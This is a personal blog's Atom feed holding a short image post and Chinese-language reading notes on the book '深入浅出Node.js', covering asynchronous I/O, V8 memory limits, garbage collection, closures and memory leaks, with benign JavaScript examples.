<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>wanglinzhizhi</title>
  <subtitle>Hi, wanglinzhizhi</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.wanglinzhizhi.me/"/>
  <updated>2017-01-23T11:45:44.000Z</updated>
  <id>http://www.wanglinzhizhi.me/</id>
  
  <author>
    <name>wanglinzhizhi</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>程序员的浪漫</title>
    <link href="http://www.wanglinzhizhi.me/2017/01/23/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E6%B5%AA%E6%BC%AB/"/>
    <id>http://www.wanglinzhizhi.me/2017/01/23/程序员的浪漫/</id>
    <published>2017-01-23T11:41:55.000Z</published>
    <updated>2017-01-23T11:45:44.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="程序-员的浪漫"><a href="#程序-员的浪漫" class="headerlink" title="程序 员的浪漫"></a>程序 员的浪漫</h2><p><img src="/images/romances-of-programmers/1.png" alt="img"></p>
<p><img src="/images/romances-of-programmers/2.png" alt="img"></p>
<p><img src="/images/romances-of-programmers/3.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Hello world :)</div></pre></td></tr></table></figure>
<p>by wanglinzhizhi</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;程序-员的浪漫&quot;&gt;&lt;a href=&quot;#程序-员的浪漫&quot; class=&quot;headerlink&quot; title=&quot;程序 员的浪漫&quot;&gt;&lt;/a&gt;程序 员的浪漫&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/images/romances-of-programmers/1.png&quot; a
    
    </summary>
    
      <category term="wanglinzhizhi" scheme="http://www.wanglinzhizhi.me/categories/wanglinzhizhi/"/>
    
    
      <category term="wanglinzhizhi" scheme="http://www.wanglinzhizhi.me/tags/wanglinzhizhi/"/>
    
      <category term="程序员的浪漫" scheme="http://www.wanglinzhizhi.me/tags/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E6%B5%AA%E6%BC%AB/"/>
    
  </entry>
  
  <entry>
    <title>深入浅出Node.js  朴灵</title>
    <link href="http://www.wanglinzhizhi.me/2017/01/23/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BANode/"/>
    <id>http://www.wanglinzhizhi.me/2017/01/23/深入浅出Node/</id>
    <published>2017-01-23T11:16:17.000Z</published>
    <updated>2017-01-23T11:16:17.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="深入浅出Node-js"><a href="#深入浅出Node-js" class="headerlink" title="深入浅出Node.js"></a>深入浅出Node.js</h1><p><strong>朴灵</strong></p>
<h2 id="1-3-Node给JavaScript带来的意义"><a href="#1-3-Node给JavaScript带来的意义" class="headerlink" title="1.3 Node给JavaScript带来的意义"></a>1.3 Node给JavaScript带来的意义</h2><p>除了HTML、WebKit和显卡这些UI相关技术没有支持外，Node的结构与Chrome十分相似。它们都是基于事件驱动的异步架构，浏览器通过事件驱动来服务界面上的交互，Node通过事件驱动来服务I/O</p>
<p>在Node中，JavaScript可以随心所欲地访问本地文件，可以搭建WebSocket服务器端，可以连接数据库，可以如Web Workers一样玩转多进程。如今，JavaScript可以运行在不同的地方，不再继续限制在浏览器中与CSS样式表、DOM树打交道。如果HTTP协议栈是水平面，Node就是浏览器在协议栈另一边的倒影。Node不处理UI，但用与浏览器相同的机制和原理运行。Node打破了过去JavaScript只能在浏览器中运行的局面。前后端编程环境统一，可以大大降低前后端转换所需要的上下文交换代价。</p>
<p>随着Node的出现，关于JavaScript的想象总是无限的。目前，社区已经出现node-webkit这样的项目，这个项目在2012年的沪JS会议上首次介绍给了公众。如同上文提及的关于浏览器的优势和限制，在node-webkit项目中，它将Node中的事件循环和WebKit的事件循环融合在一起，既可以通过它享受HTML、CSS带来的UI构建，也能通过它访问本地资源，将两者的优势整合到一起。桌面应用程序的开发可以完全通过HTML、CSS、JavaScript完成。</p>
<h3 id="1-4-1-异步I-O"><a href="#1-4-1-异步I-O" class="headerlink" title="1.4.1 异步I/O"></a>1.4.1 异步I/O</h3><p>下面的代码用于发起一个Ajax请求：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"></div><div class="line">$.post(<span class="string">'/url'</span>, &#123;</div><div class="line">  <span class="attr">title</span>: <span class="string">'深入浅出Node.js'</span></div><div class="line">&#125;, <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'收到响应'</span>);</div><div class="line">&#125;);</div><div class="line"><span class="built_in">console</span>.log(<span class="string">'发送Ajax结束'</span>);</div></pre></td></tr></table></figure>
<p>熟悉异步的用户必然知道，“收到响应”是在“发送Ajax结束”之后输出的。在调用$.post()后，后续代码是被立即执行的，而“收到响应”的执行时间是不被预期的。我们只知道它将在这个异步请求结束后执行，但并不知道具体的时间点。异步调用中对于结果值的捕获是符合“Don’t call me, I will call you”的原则的，这也是注重结果，不关心过程的一种表现</p>
<p>在Node中，异步I/O也很常见。以读取文件为例，我们可以看到它与前端Ajax调用的方式是极其类似的：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</div><div class="line">fs.readFile(<span class="string">'/path'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err, file</span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'读取文件完成'</span>)</div><div class="line">&#125;);</div><div class="line"><span class="built_in">console</span>.log(<span class="string">'发起读取文件'</span>);</div></pre></td></tr></table></figure>
<p>这里的“发起读取文件”是在“读取文件完成”之前输出的。同样，“读取文件完成”的执行也取决于读取文件的异步调用何时结束。图1-3是一个经典的异步调用。</p>
<p>在Node中，绝大多数的操作都以异步的方式进行调用。RyanDahl排除万难，在底层构建了很多异步I/O的API，从文件读取到网络请求等，均是如此。这样的意义在于，在Node中，我们可以从语言层面很自然地进行并行I/O操作。每个调用之间无须等待之前的I/O调用结束。在编程模型上可以极大提升效率。</p>
<p>下面的两个文件读取任务的耗时取决于最慢的那个文件读取的耗时：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"></div><div class="line">fs.readFile(<span class="string">'/path1'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err, file</span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'读取文件1完成'</span>);</div><div class="line">&#125;);</div><div class="line"></div><div class="line">fs.readFile(<span class="string">'/path2'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err, file</span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'读取文件2完成'</span>);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>而对于同步I/O而言，它们的耗时是两个任务的耗时之和</p>
<h3 id="5-1-1-Node与V8"><a href="#5-1-1-Node与V8" class="headerlink" title="5.1.1 Node与V8"></a>5.1.1 Node与V8</h3><p>关于V8，它的来历与背景亦是大有来头。作为虚拟机，V8的性能表现优异，这与它的领导者有莫大的渊源，Chrome的成功也离不开它背后的天才——Lars Bak</p>
<p>在Lars的工作履历里，绝大部分都是与虚拟机相关的工作。在开发V8之前，他曾经在Sun公司工作，担任HotSpot团队的技术领导，主要致力于开发高性能的Java虚拟机。在这之前，他也曾为Self、Smalltalk语言开发过高性能虚拟机。这些无与伦比的经历让V8一出世就超越了当时所有的JavaScript虚拟机。</p>
<p>Node在JavaScript的执行上直接受益于V8，可以随着V8的升级就能享受到更好的性能或新的语言特性（如ES5和ES6）等，同时也受到V8的一些限制，尤其是本章要重点讨论的内存限制。</p>
<h3 id="5-1-2-V8的内存限制"><a href="#5-1-2-V8的内存限制" class="headerlink" title="5.1.2 V8的内存限制"></a>5.1.2 V8的内存限制</h3><p>在一般的后端开发语言中，在基本的内存使用上没有什么限制，然而在Node中通过JavaScript使用内存时就会发现只能使用部分内存（64位系统下约为1.4 GB，32位系统下约为0.7GB）。在这样的限制下，将会导致Node无法直接操作大内存对象，比如无法将一个2 GB的文件读入内存中进行字符串分析处理，即使物理内存有32 GB。这样在单个Node进程的情况下，计算机的内存资源无法得到充足的使用。</p>
<p>造成这个问题的主要原因在于Node基于V8构建，所以在Node中使用的JavaScript对象基本上都是通过V8自己的方式来进行分配和管理的。V8的这套内存管理机制在浏览器的应用场景下使用起来绰绰有余，足以胜任前端页面中的所有需求。但在Node中，这却限制了开发者随心所欲使用大内存的想法。</p>
<h3 id="5-1-3-V8的对象分配"><a href="#5-1-3-V8的对象分配" class="headerlink" title="5.1.3 V8的对象分配"></a>5.1.3 V8的对象分配</h3><p>在V8中，所有的JavaScript对象都是通过堆来进行分配的</p>
<p>当我们在代码中声明变量并赋值时，所使用对象的内存就分配在堆中。如果已申请的堆空闲内存不够分配新的对象，将继续申请堆内存，直到堆的大小超过V8的限制为止</p>
<p>至于V8为何要限制堆的大小，表层原因为V8最初为浏览器而设计，不太可能遇到用大量内存的场景。对于网页来说，V8的限制值已经绰绰有余。深层原因是V8的垃圾回收机制的限制。按官方的说法，以1.5 GB的垃圾回收堆内存为例，V8做一次小的垃圾回收需要50毫秒以上，做一次非增量式的垃圾回收甚至要1秒以上。这是垃圾回收中引起JavaScript线程暂停执行的时间，在这样的时间花销下，应用的性能和响应能力都会直线下降。这样的情况不仅仅后端服务无法接受，前端浏览器也无法接受。因此，在当时的考虑下直接限制堆内存是一个好的选择。</p>
<p>当然，这个限制也不是不能打开，V8依然提供了选项让我们使用更多的内存。Node在启动时可以传递<code>--max-old-space-size</code>或<code>--max-new-space-size</code> 来调整内存限制的大小，示例如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">node --max-old-space-size=1700 test.js // 单位为MB// 或者</div><div class="line">node --max-new-space-size=1024 test.js // 单位为KB</div></pre></td></tr></table></figure>
<p>上述参数在V8初始化时生效，一旦生效就不能再动态改变。如果遇到Node无法分配足够内存给JavaScript对象的情况，可以用这个办法来放宽V8默认的内存限制，避免在执行过程中稍微多用了一些内存就轻易崩溃。</p>
<h3 id="5-1-4-V8的垃圾回收机制"><a href="#5-1-4-V8的垃圾回收机制" class="headerlink" title="5.1.4 V8的垃圾回收机制"></a>5.1.4 V8的垃圾回收机制</h3><p>V8的垃圾回收策略主要基于分代式垃圾回收机制。在自动垃圾回收的演变过程中，人们发现没有一种垃圾回收算法能够胜任所有的场景。因为在实际的应用中，对象的生存周期长短不一，不同的算法只能针对特定情况具有最好的效果。</p>
<p>在V8中，主要将内存分为新生代和老生代两代。新生代中的对象为存活时间较短的对象，老生代中的对象为存活时间较长或常驻内存的对象。</p>
<p>V8堆的整体大小就是新生代所用内存空间加上老生代的内存空间</p>
<p>前面我们提及的–max-old-space-size命令行参数可以用于设置老生代内存空间的最大值，–max-new-space-size命令行参数则用于设置新生代内存空间的大小的。比较遗憾的是，这两个最大值需要在启动时就指定。这意味着V8使用的内存没有办法根据使用情况自动扩充，当内存分配过程中超过极限值时，就会引起进程出错。</p>
<p>对于新生代内存，它由两个<code>reserved_semispace_size_</code> 所构成，后面将描述其原因。按机器位数不同，reserved_semispace<em>size</em>在64位系统和32位系统上分别为16 MB和8 MB。所以新生代内存的最大值在64位系统和32位系统上分别为32 MB和16 MB。</p>
<p>Cheney算法是一种采用复制的方式实现的垃圾回收算法。它将堆内存一分为二，每一部分空间称为semispace。在这两个semispace空间中，只有一个处于使用中，另一个处于闲置状态。处于使用状态的semispace空间称为From空间，处于闲置状态的空间称为To空间。当我们分配对象时，先是在From空间中进行分配。当开始进行垃圾回收时，会检查From空间中的存活对象，这些存活对象将被复制到To空间中，而非存活对象占用的空间将会被释放。完成复制后，From空间和To空间的角色发生对换。简而言之，在垃圾回收的过程中，就是通过将存活对象在两个semispace空间之间进行复制。</p>
<p>Scavenge的缺点是只能使用堆内存中的一半，这是由划分空间和复制机制所决定的。但Scavenge由于只复制存活的对象，并且对于生命周期短的场景存活对象只占少部分，所以它在时间效率上有优异的表现。</p>
<p>由于Scavenge是典型的牺牲空间换取时间的算法，所以无法大规模地应用到所有的垃圾回收中。但可以发现，Scavenge非常适合应用在新生代中，因为新生代中对象的生命周期较短，恰恰适合这个算法。</p>
<p>当一个对象经过多次复制依然存活时，它将会被认为是生命周期较长的对象。这种较长生命周期的对象随后会被移动到老生代中，采用新的算法进行管理。对象从新生代中移动到老生代中的过程称为晋升</p>
<p>对于老生代中的对象，由于存活对象占较大比重，再采用Scavenge的方式会有两个问题：一个是存活对象较多，复制存活对象的效率将会很低；另一个问题依然是浪费一半空间的问题。这两个问题导致应对生命周期较长的对象时Scavenge会显得捉襟见肘。为此，V8在老生代中主要采用了Mark-Sweep和Mark-Compact相结合的方式进行垃圾回收。</p>
<p>Mark-Sweep是标记清除的意思，它分为标记和清除两个阶段。与Scavenge相比，Mark-Sweep并不将内存空间划分为两半，所以不存在浪费一半空间的行为。与Scavenge复制活着的对象不同，Mark-Sweep在标记阶段遍历堆中的所有对象，并标记活着的对象，在随后的清除阶段中，只清除没有被标记的对象。可以看出，Scavenge中只复制活着的对象，而Mark-Sweep只清理死亡对象。活对象在新生代中只占较小部分，死对象在老生代中只占较小部分，这是两种回收方式能高效处理的原因</p>
<p>Mark-Sweep最大的问题是在进行一次标记清除回收后，内存空间会出现不连续的状态。这种内存碎片会对后续的内存分配造成问题，因为很可能出现需要分配一个大对象的情况，这时所有的碎片空间都无法完成此次分配，就会提前触发垃圾回收，而这次回收是不必要的。<br>为了解决Mark-Sweep的内存碎片问题，Mark-Compact被提出来。Mark-Compact是标记整理的意思，是在Mark-Sweep的基础上演变而来的。它们的差别在于对象在标记为死亡后，在整理的过程中，将活着的对象往一端移动，移动完成后，直接清理掉边界外的内存。</p>
<p>，在Mark-Sweep和Mark-Compact之间，由于Mark-Compact需要移动对象，所以它的执行速度不可能很快，所以在取舍上，V8主要使用Mark-Sweep，在空间不足以对从新生代中晋升过来的对象进行分配时才使用Mark-Compact。</p>
<p>为了避免出现JavaScript应用逻辑与垃圾回收器看到的不一致的情况，垃圾回收的3种基本算法都需要将应用逻辑暂停下来，待执行完垃圾回收后再恢复执行应用逻辑，这种行为被称为“全停顿”（stop-the-world）。在V8的分代式垃圾回收中，一次小垃圾回收只收集新生代，由于新生代默认配置得较小，且其中存活对象通常较少，所以即便它是全停顿的影响也不大。但V8的老生代通常配置得较大，且存活对象较多，全堆垃圾回收（full 垃圾回收）的标记、清理、整理等动作造成的停顿就会比较可怕，需要设法改善。</p>
<p>图5-8　增量标记示意图<br>V8在经过增量标记的改进后，垃圾回收的最大停顿时间可以减少到原本的1/6左右。V8后续还引入了延迟清理（lazy sweeping）与增量式整理（incremental compaction），让清理与整理动作也变成增量式的。同时还计划引入并行标记与并行清理，进一步利用多核性能降低每次停顿的时间。</p>
<p>从V8的自动垃圾回收机制的设计角度可以看到，V8对内存使用进行限制的缘由。新生代设计为一个较小的内存空间是合理的，而老生代空间过大对于垃圾回收并无特别意义。V8对内存限制的设置对于Chrome浏览器这种每个选项卡页面使用一个V8实例而言，内存的使用是绰绰有余了。对于Node编写的服务器端来说，内存限制也并不影响正常场景下的使用。但是对于V8的垃圾回收特点和JavaScript在单线程上的执行情况，垃圾回收是影响性能的因素之一。想要高性能的执行效率，需要注意让垃圾回收尽量少地进行，尤其是全堆垃圾回收。<br>以Web服务器中的会话实现为例，一般通过内存来存储，但在访问量大的时候会导致老生代中的存活对象骤增，不仅造成清理/整理过程费时，还会造成内存紧张，甚至溢出</p>
<h3 id="5-1-5-查看垃圾回收日志"><a href="#5-1-5-查看垃圾回收日志" class="headerlink" title="5.1.5 查看垃圾回收日志"></a>5.1.5 查看垃圾回收日志</h3><p>查看垃圾回收日志的方式主要是在启动时添加–trace_gc参数。在进行垃圾回收时，将会从标准输出中打印垃圾回收的日志信息。下面是一段示例，执行结束后，将会在gc.log文件中得到所有垃圾回收信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">node --trace_gc <span class="_">-e</span> <span class="string">"var a = [];for (var i = 0; i&lt; 1000000; i++) a.push(new Array(100));"</span> &gt; gc.log</div></pre></td></tr></table></figure>
<h3 id="5-2-高效使用内存"><a href="#5-2-高效使用内存" class="headerlink" title="5.2 高效使用内存"></a>5.2 高效使用内存</h3><p>高效使用内存<br>在V8面前，开发者所要具备的责任是如何让垃圾回收机制更高效地工作。</p>
<h3 id="5-2-1-作用域"><a href="#5-2-1-作用域" class="headerlink" title="5.2.1 作用域"></a>5.2.1 作用域</h3><p>提到如何触发垃圾回收，第一个要介绍的是作用域（scope）。在JavaScript中能形成作用域的有函数调用、with以及全局作用</p>
<p>foo()函数在每次被调用时会创建对应的作用域，函数执行结束后，该作用域将会销毁。同时作用域中声明的局部变量分配在该作用域上，随作用域的销毁而销毁。只被局部变量引用的对象存活周期较短</p>
<p>将会分配在新生代中的From空间中。在作用域释放后，局部变量local失效，其引用的对象将会在下次垃圾回收时被释放。</p>
<p>标识符查找<br>与作用域相关的即是标识符查找。所谓标识符，可以理解为变量名。在下面的代码中，执行bar()函数时，将会遇到local变量：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> bar = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(local);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>JavaScript在执行时会去查找该变量定义在哪里。它最先查找的是当前作用域，如果在当前作用域中无法找到该变量的声明，将会向上级的作用域里查找，直到查到为止。</p>
<h3 id="2-作用域链"><a href="#2-作用域链" class="headerlink" title="2. 作用域链"></a>2. 作用域链</h3><p>local变量在baz()函数形成的作用域里查找不到，继而将在bar()的作用域里寻找。如果去掉上述代码bar()中的local声明，将会继续向上查找，一直到全局作用域。这样的查找方式使得作用域像一个链条。由于标识符的查找方向是向上的，所以变量只能向外访问，而不能向内访问。</p>
<p>当我们在baz()函数中访问local变量时，由于作用域中的变量列表中没有local，所以会向上一个作用域中查找，接着会在bar()函数执行得到的变量列表中找到了一个local变量的定义，于是使用它。尽管在再上一层的作用域中也存在local的定义，但是不会继续查找了。如果查找一个不存在的变量，将会一直沿着作用域链查找到全局作用域，最后抛出未定义错误。</p>
<p>变量的主动释放</p>
<p>如果变量是全局变量（不通过var声明或定义在global变量上），由于全局作用域需要直到进程退出才能释放，此时将导致引用的对象常驻内存（常驻在老生代中）。如果需要释放常驻内存的对象，可以通过delete操作来删除引用关系。或者将变量重新赋值，让旧的对象脱离引用关系。在接下来的老生代内存清除和整理的过程中，会被回收释放。下面为示例代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">global.foo = <span class="string">"I am global object"</span>;</div><div class="line"><span class="built_in">console</span>.log(global.foo);<span class="comment">// =&gt;"I am global object"</span></div><div class="line"><span class="keyword">delete</span> global.foo;<span class="comment">// 或者重新赋值</span></div><div class="line">global.foo = <span class="literal">undefined</span>; <span class="comment">// or nullconsole.log(global.foo); // =&gt; undefined</span></div></pre></td></tr></table></figure>
<p>同样，如果在非全局作用域中，想主动释放变量引用的对象，也可以通过这样的方式。虽然delete操作和重新赋值具有相同的效果，但是在V8中通过delete删除对象的属性有可能干扰V8的优化，所以通过赋值方式解除引用更好。</p>
<h3 id="5-2-2-闭包"><a href="#5-2-2-闭包" class="headerlink" title="5.2.2 闭包"></a>5.2.2 闭包</h3><p>我们知道作用域链上的对象访问只能向上，这样外部无法向内部访问。</p>
<p>在JavaScript中，实现外部作用域访问内部作用域中变量的方法叫做闭包（closure）。这得益于高阶函数的特性：函数可以作为参数或者返回值。</p>
<p>一般而言，在bar()函数执行完成后，局部变量local将会随着作用域的销毁而被回收。但是注意这里的特点在于返回值是一个匿名函数，且这个函数中具备了访问local的条件。虽然在后续的执行中，在外部作用域中还是无法直接访问local，但是若要访问它，只要通过这个中间函数稍作周转即可</p>
<p>闭包是JavaScript的高级特性，利用它可以产生很多巧妙的效果。它的问题在于，一旦有变量引用这个中间函数，这个中间函数将不会释放，同时也会使原始的作用域不会得到释放，作用域中产生的内存占用也不会得到释放。除非不再有引用，才会逐步释放。</p>
<h3 id="5-2-3-小结"><a href="#5-2-3-小结" class="headerlink" title="5.2.3 小结"></a>5.2.3 小结</h3><p>在正常的JavaScript执行中，无法立即回收的内存有闭包和全局变量引用这两种情况。由于V8的内存限制，要十分小心此类变量是否无限制地增加，因为它会导致老生代中的对象增多</p>
<h3 id="5-3-内存指标"><a href="#5-3-内存指标" class="headerlink" title="5.3 内存指标"></a>5.3 内存指标</h3><p>一般而言，应用中存在一些全局性的对象是正常的，而且在正常的使用中，变量都会自动释放回收。但是也会存在一些我们认为会回收但是却没有被回收的对象，这会导致内存占用无限增长。一旦增长达到V8的内存限制，将会得到内存溢出错误，进而导致进程退出。</p>
<h3 id="5-3-2-堆外内存"><a href="#5-3-2-堆外内存" class="headerlink" title="5.3.2 堆外内存"></a>5.3.2 堆外内存</h3><p>我们看到15次循环都完整执行，并且三个内存占用值与前一个示例完全不同。在改造后的输出结果中，heapTotal与heapUsed的变化极小，唯一变化的是rss的值，并且该值已经远远超过V8的限制值。这其中的原因是Buffer对象不同于其他对象，它不经过V8的内存分配机制，所以也不会有堆内存的大小限制。</p>
<p>这意味着利用堆外内存可以突破内存限制的问题。<br>为何Buffer对象并非通过V8分配？这在于Node并不同于浏览器的应用场景。在浏览器中，JavaScript直接处理字符串即可满足绝大多数的业务需求，而Node则需要处理网络流和文件I/O流，操作字符串远远不能满足传输的性能需求。</p>
<h3 id="5-3-3-小结"><a href="#5-3-3-小结" class="headerlink" title="5.3.3 小结"></a>5.3.3 小结</h3><p>Node的内存构成主要由通过V8进行分配的部分和Node自行分配的部分。受V8的垃圾回收限制的主要是V8的堆内存。</p>
<h3 id="5-4-内存泄漏"><a href="#5-4-内存泄漏" class="headerlink" title="5.4 内存泄漏"></a>5.4 内存泄漏</h3><p>Node对内存泄漏十分敏感，一旦线上应用有成千上万的流量，那怕是一个字节的内存泄漏也会造成堆积，垃圾回收过程中将会耗费更多时间进行对象扫描，应用响应缓慢，直到进程内存溢出，应用崩</p>
<p>在V8的垃圾回收机制下，在通常的代码编写中，很少会出现内存泄漏的情况。但是内存泄漏通常产生于无意间，较难排查。尽管内存泄漏的情况不尽相同，但其实质只有一个，那就是应当回收的对象出现意外而没有被回收，变成了常驻在老生代中的对象。</p>
<p>通常，造成内存泄漏的原因有如下几个。<br>缓存。队列消费不及时。<br>作用域未释放。</p>
<h3 id="5-4-1-慎将内存当做缓存"><a href="#5-4-1-慎将内存当做缓存" class="headerlink" title="5.4.1 慎将内存当做缓存"></a>5.4.1 慎将内存当做缓存</h3><p>慎将内存当做缓存</p>
<p>缓存在应用中的作用举足轻重，可以十分有效地节省资源。因为它的访问效率要比I/O的效率高，一旦命中缓存，就可以节省一次I/O的时间。</p>
<p>但是在Node中，缓存并非物美价廉。一旦一个对象被当做缓存来使用，那就意味着它将会常驻在老生代中。缓存中存储的键越多，长期存活的对象也就越多，这将导致垃圾回收在进行扫描和整理时，对这些对象做无用功。<br>另一个问题在于，JavaScript开发者通常喜欢用对象的键值对来缓存东西，但这与严格意义上的缓存又有着区别，严格意义的缓存有着完善的过期策略，而普通对象的键值对并没有。</p>
<p>十分容易理解，如果需要，只要限定缓存对象的大小，加上完善的过期策略以防止内存无限制增长，还是可以一用的。</p>
<p>这里给出一个可能无意识造成内存泄漏的场景：memoize。</p>
<p>它的原理是以参数作为键进行缓存，以内存空间换CPU执行时间。这里潜藏的陷阱即是每个被执行的结果都会按参数缓存在memo对象上，不会被清除。这在前端网页这种短时应用场景中不存在大问题，但是执行量大和参数多样性的情况下，会造成内存占用不释放。</p>
<p>所以在Node中，任何试图拿内存当缓存的行为都应当被限制。当然，这种限制并不是不允许使用的意思，而是要小心为之。</p>
<p>为了解决缓存中的对象永远无法释放的问题，需要加入一种策略来限制缓存的无限增长。</p>
<p>为此我曾写过一个模块limitablemap，它可以实现对键值数量的限制。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> LimitableMap = <span class="function"><span class="keyword">function</span> (<span class="params">limit</span>) </span>&#123;</div><div class="line">  <span class="keyword">this</span>.limit = limit || <span class="number">10</span>; <span class="keyword">this</span>.map = &#123;&#125;;</div><div class="line">    <span class="keyword">this</span>.keys = [];</div><div class="line">  &#125;;</div><div class="line">  <span class="keyword">var</span> hasOwnProperty = <span class="built_in">Object</span>.prototype.hasOwnProperty;</div><div class="line">  LimitableMap.prototype.set = <span class="function"><span class="keyword">function</span> (<span class="params">key, value</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> map = <span class="keyword">this</span>.map; <span class="keyword">var</span> keys = <span class="keyword">this</span>.keys;</div><div class="line">    <span class="keyword">if</span> (!hasOwnProperty.call(map, key)) &#123;</div><div class="line">      <span class="keyword">if</span> (keys.length === <span class="keyword">this</span>.limit) &#123;</div><div class="line">        <span class="keyword">var</span> firstKey = keys.shift();</div><div class="line">        <span class="keyword">delete</span> map[firstKey];</div><div class="line">      &#125;</div><div class="line">      keys.push(key);</div><div class="line">    &#125;</div><div class="line">    map[key] = value;</div><div class="line">  &#125;;</div><div class="line">  LimitableMap.prototype.get = <span class="function"><span class="keyword">function</span> (<span class="params">key</span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.map[key];</div><div class="line">  &#125;;</div><div class="line">  <span class="built_in">module</span>.exports = LimitableMap</div></pre></td></tr></table></figure>
<p>实现过程还是非常简单的。记录键在数组中，一旦超过数量，就以先进先出的方式进行淘汰。</p>
<p>这种淘汰策略并不是十分高效，只能应付小型应用场景。如果需要更高效的缓存，可以参见Isaac Z.Schlueter采用LRU算法的缓存，地址为<a href="https://github.com/isaacs/node-lru-cache。结合有限制的缓存，memoize还是可用的。" target="_blank" rel="external">https://github.com/isaacs/node-lru-cache。结合有限制的缓存，memoize还是可用的。</a></p>
<p>另一个案例在于模块机制。在第2章的模块介绍中，为了加速模块的引入，所有模块都会通过编译执行，然后被缓存起来。由于通过exports导出的函数，可以访问文件模块中的私有变量，这样每个文件模块在编译执行后形成的作用域因为模块缓存的原因，不会被释放。示例代码如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"></div><div class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">exports, require, module, __filename, __dirname</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> local =<span class="string">"局部变量"</span>;</div><div class="line">  exports.get = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> local;</div><div class="line">  &#125;;</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>由于模块的缓存机制，模块是常驻老生代的。在设计模块时，要十分小心内存泄漏的出现。在下面的代码，每次调用leak()方法时，都导致局部变量leakArray不停增加内存的占用，且不被释放：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> leakArray = [];</div><div class="line">exports.leak = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  leakArray.push(<span class="string">"leak"</span> + <span class="built_in">Math</span>.random());</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>如果模块不可避免地需要这么设计，那么请添加清空队列的相应接口，以供调用者释放内存。</p>
<h3 id="缓存的解决方案"><a href="#缓存的解决方案" class="headerlink" title="缓存的解决方案"></a>缓存的解决方案</h3><p>直接将内存作为缓存的方案要十分慎重。除了限制缓存的大小外，另外要考虑的事情是，进程之间无法共享内存。如果在进程内使用缓存，这些缓存不可避免地有重复，对物理内存的使用是一种浪费。如何使用大量缓存，目前比较好的解决方案是采用进程外的缓存，进程自身不存储状态。外部的缓存软件有着良好的缓存过期淘汰策略以及自有的内存管理，不影响Node进程的性能。它的好处多多，在Node中主要可以解决以下两个问题。</p>
<p>（1）将缓存转移到外部，减少常驻内存的对象的数量，让垃圾回收更高效。<br>（2）进程之间可以共享缓存。</p>
<p>目前，市面上较好的缓存有Redis和Memcached。Node模块的生态系统十分完善，这两个产品的客户端都有，通过以下地址可以查看具体使用详情。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Redis：https://github.com/mranney/node_redis。</div><div class="line">Memcached：https://github.com/3rd-Eden/node-memcached。</div></pre></td></tr></table></figure>
<h3 id="5-4-2-关注队列状态"><a href="#5-4-2-关注队列状态" class="headerlink" title="5.4.2 关注队列状态"></a>5.4.2 关注队列状态</h3><p>关注队列状态</p>
<p>在解决了缓存带来的内存泄漏问题后，另一个不经意产生的内存泄漏则是队列。在第4章中可以看到，在JavaScript中可以通过队列（数组对象）来完成许多特殊的需求，比如Bagpipe。队列在消费者-生产者模型中经常充当中间产物。这是一个容易忽略的情况，因为在大多数应用场景下，消费的速度远远大于生产的速度，内存泄漏不易产生。但是一旦消费速度低于生产速度，将会形成堆积。</p>
<p>举个实际的例子，有的应用会收集日志。如果欠缺考虑，也许会采用数据库来记录日志。日志通常会是海量的，数据库构建在文件系统之上，写入效率远远低于文件直接写入，于是会形成数据库写入操作的堆积，而JavaScript中相关的作用域也不会得到释放，内存占用不会回落，从而出现内存泄漏。</p>
